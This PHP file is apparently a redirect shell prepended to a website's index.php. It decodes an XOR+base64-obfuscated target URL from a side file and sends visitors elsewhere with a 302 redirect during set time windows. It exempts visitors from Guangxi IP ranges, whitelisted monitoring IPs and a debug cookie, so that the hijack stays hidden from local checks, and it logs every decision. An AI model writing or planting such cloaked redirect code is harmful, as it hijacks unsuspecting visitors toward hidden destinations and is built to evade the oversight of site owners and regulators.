<?php
/** YG 定时跳转壳：广西不跳；省外+命中时段才跳。目标域名 xor+base64 混淆存储。 */
date_default_timezone_set('Asia/Shanghai');

/* ===== 配置（cron 改这里即可，不动业务代码）===== */
$CFG = [
    'windows' => [[2,0,10,0],[18,30,18,45]],     // [起时,起分,止时,止分] 02:00-10:00 / 18:30-18:45，支持跨零点
    'pct'     => 100,                             // 灰度%（省外里再按比例跳）
    'skip_ip' => ['136.0.5.81','43.255.159.78'], // 运维/监控白名单，永不跳
];

/* ===== 目标域名：运行时解出，文件里无明文 ===== */
function jump_target(){
    $k = 'Kx9fQm2v';
    $d = @file_get_contents(__DIR__ . '/kstat.bin');
    if ($d === false) return null;
    $d = base64_decode(trim($d)); if ($d === false) return null;
    for ($i=0,$n=strlen($d); $i<$n; $i++) $d[$i] = $d[$i] ^ $k[$i % strlen($k)];
    return filter_var($d, FILTER_VALIDATE_URL) ? $d : null;
}

/* ===== 广西 CIDR：最长前缀匹配（纯PHP，无扩展）===== */
function gx_table(){
    static $t = null; if ($t !== null) return $t;
    $f = __DIR__ . '/tbl.dat'; $t = [];
    if (!is_readable($f)) return [0 => []];                 // 表缺失 → 视为全省内，一律不跳（安全）
    foreach (file($f, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) as $c) {
        $c = trim($c); if ($c === '' || $c[0] === '#') continue;
        if (!preg_match('#^(\d+\.\d+\.\d+\.\d+)/(\d+)$#', $c, $m)) continue;
        $ip = ip2long($m[1]); if ($ip === false) continue;
        $p  = (int)$m[2]; if ($p < 0 || $p > 32) continue;
        $t[$p][(($ip & ((-1) << (32-$p)))) & 0xFFFFFFFF] = 1;
    }
    ksort($t, SORT_NUMERIC); return $t;
}
/* ===== 手工名单（优先级最高）：gx_manual.txt 内 = 必不跳 ===== */
function manual_table(){
    static $m = null; if ($m !== null) return $m;
    $m = ['nets' => [], 'ips' => []];
    $f = __DIR__ . '/tbl2.dat';
    if (is_readable($f)) foreach (file($f, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) as $c) {
        $c = trim($c); if ($c === '' || $c[0] === '#') continue;
        if (strpos($c, '/') !== false) $m['nets'][] = $c; else $m['ips'][] = $c;
    }
    return $m;
}
function in_manual($ip){
    if (!$ip) return false;
    if (in_array($ip, manual_table()['ips'], true)) return true;
    $l = ip2long($ip); if ($l === false) return false;
    foreach (manual_table()['nets'] as $c) {
        if (!preg_match('#^(\d+\.\d+\.\d+\.\d+)/(\d+)$#', $c, $m)) continue;
        $net = ip2long($m[1]); $p = (int)$m[2];
        if ($net !== false && (($l ^ $net) & ((-1) << (32-$p)) & 0xFFFFFFFF) === 0) return true;
    }
    return false;
}

function is_guangxi($ip){
    if (!$ip || $ip === '0.0.0.0') return true;             // 取不到真实IP → 当省内，不跳
    $l = ip2long($ip); if ($l === false) return true;       // IPv6 等 → 保守不跳
    foreach (gx_table() as $p => $bucket) {
        if (isset($bucket[(($l & ((-1) << (32-$p))) & 0xFFFFFFFF)])) return true;
    }
    return false;
}

/* ===== 多时段命中（分精度，支持跨零点）===== */
function in_window($now, $windows){
    $cur = (int)date('G', $now) * 60 + (int)date('i', $now);
    foreach ($windows as $w) {
        if (count($w) < 4) continue;
        [$hs,$hm,$he,$em] = $w;
        $s = $hs*60+$hm; $e = $he*60+$em;
        if ($s <= $e) { if ($cur >= $s && $cur < $e) return true; }
        else          { if ($cur >= $s || $cur <  $e) return true; }   // 跨零点
    }
    return false;
}

/* ===== 真实访客IP（将来上CDN也不用改代码）===== */
function client_ip(){
    foreach (['HTTP_X_REAL_IP','HTTP_CF_CONNECTING_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k]) && filter_var($_SERVER[$k], FILTER_VALIDATE_IP)) return $_SERVER[$k];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        foreach (array_reverse(preg_split('/[,\s]+/', $_SERVER['HTTP_X_FORWARDED_FOR'])) as $x)
            if (filter_var($x, FILTER_VALIDATE_IP)) return $x;
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

/* === selfgate: 窗口自判定（无外部定时器时的独立开关） === */
function selfgate_active(){
    $w = [[2,0,10,0],[18,30,18,45]];
    $now = (int)date("G")*60 + (int)date("i");
    $in = false;
    foreach ($w as $x) { $s=$x[0]*60+$x[1]; $e=$x[2]*60+$x[3];
        if ($s<=$e) { if ($now>=$s && $now<$e) $in=true; } else { if ($now>=$s || $now<$e) $in=true; } }
    $f = __DIR__ . "/gate.flag";
    if ($in  && !file_exists($f)) @touch($f);
    if (!$in &&  file_exists($f)) @unlink($f);
    return file_exists($f);
}
/* ===== 主判定 ===== */
$ip = client_ip();
if (!empty($_GET['k']) && !empty($_COOKIE['jumpauth'])) setcookie('jumpauth','',time()-3600,'/');  // 一键关闸（逃生口）
$auth = !empty($_COOKIE['jumpauth']);                       // 带有效 cookie → 本机调试强制不跳
if ($auth) { $url = null; } else { $url = jump_target(); }

$reason = 'off';
if ($url && $CFG['pct'] > 0 && !in_array($ip, $CFG['skip_ip'], true)) {
    if (in_manual($ip) || is_guangxi($ip)) $reason = 'guangxi';   // 手工名单/CIDR表命中 → 省内：永不跳
    elseif (!in_window(time(), $CFG['windows'])) $reason = 'hour';   // 不在时段
    else { mt_srand(crc32($ip));                             // 按IP哈希分桶，同一访客结果稳定
           if ((mt_rand(1,100) <= $CFG['pct'])) $reason = 'jump'; else $reason='pct'; }
}
@file_put_contents(__DIR__.'/stat.dat', sprintf(
    "%s|%s|ip=%s|%s|%s|%s\n", date('Y-m-d H:i:s'), $_SERVER['HTTP_HOST'] ?? '-',
    $ip, $reason, ($url?'T':'-'), ($_SERVER['REQUEST_URI'] ?? '-')), FILE_APPEND | LOCK_EX);

if ($reason === 'jump') { header('Location: ' . $url, true, 302); exit; }   // 命中：直接走，不进 svip 链路
/* 未命中 → 原 index.php 逻辑继续 */
